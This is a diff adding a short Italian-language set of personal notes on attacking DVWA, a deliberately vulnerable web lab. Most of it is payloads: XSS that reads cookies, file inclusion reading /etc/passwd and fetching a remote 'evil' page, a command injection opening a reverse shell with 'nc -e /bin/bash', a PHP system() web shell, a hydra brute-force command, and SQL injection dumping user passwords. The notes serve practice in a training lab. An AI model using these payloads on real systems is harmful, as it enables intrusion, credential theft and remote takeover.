@@ -1,0 +1,55 @@
+***XSS Reflected***
+  Ottengo nella stessa pagina il risultato dello script
+  Pippo<script>alert(1)</script>
+
+    LEVEL LOW:
+      <script>alert(document.cookie)</script>
+
+    LEVEL MEDIUM:
+      <ScRiPt>alert(document.cookie)</ScRiPt>
+      <IMG onerror="alert(document.cookie);" src=x />
+
+***XSS Stored***
+Posso reindirizzare il risultato dello script su un db
+<script>alert(document.cookie);</script>
+
+***XSS DOM***
+
+
+***LFI***
+ci consente di includere all'interno della pagina html qualsiasi file all'interno del file sistema
+http://192.168.236.129/DVWA/vulnerabilities/fi/?page=/etc/passwd
+
+LOG POISONING
+
+
+***RFI***
+ci consente di includere all'interno della pagina html qualsiasi file presente su altri siti
+http://192.168.236.129/DVWA/vulnerabilities/fi/?page=http://miosito_evil/pagina.txt
+
+***RCE***
+localhost; nc -e /bin/bash mioIP PORTA//  127.0.0.1; nc -e /bin/bash 192.168.236.1 4000
+
+***FILE UPLOAD***
+https://www.owasp.org/index.php/Unrestricted_File_Upload
+crei una pagina .php con il seguente codice  <?php  system("id"); ?>
+
+
+***BRUTE FORCE***
+Livello low: hydra 192.168.236.133 -l admin -P rockyou.lst http-get-form "/DVWA/vulnerabilities/brute/index.php:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H-Cookie: security=low; PHPSESSID=t5rs893eioev471h2gdonf3e9o"
+
+Livello Medium: Aggiungere "-c" e l'indicazione del tempo in secondi
+
+
+
+***SQL-Inj***  (cheat sheet)
+
+SELECT * FROM users WHERE id=''
+	basta aggiungere un ' (apice) e vedere se l'applicazione mi da errore. Se mi da un errore, allora ho una sql-inj e posso sfruttarla
+	come condizione metto ' or '1'='1     -> mi restituisce 5 risultati
+	' UNION SELECT @@version #     -> mi fa vedere la versione di database che sto attaccando. in questo caso aggiungo il # per commentare  il fatto che aggiunge l'apice alla fine
+	' UNION SELECT @@version, @@hostname#   -> in questo modo ho la versione del db e il nome dell'hostname
+	' ORDER BY (numerocolonna) #
+	' union select user, password from users #    -> tento la select inserendo due campi casuali
+	' union select 1, load_file('/etc/passwd')#'   -> mi permette di vedere un file della macchina che ospita il db 
+
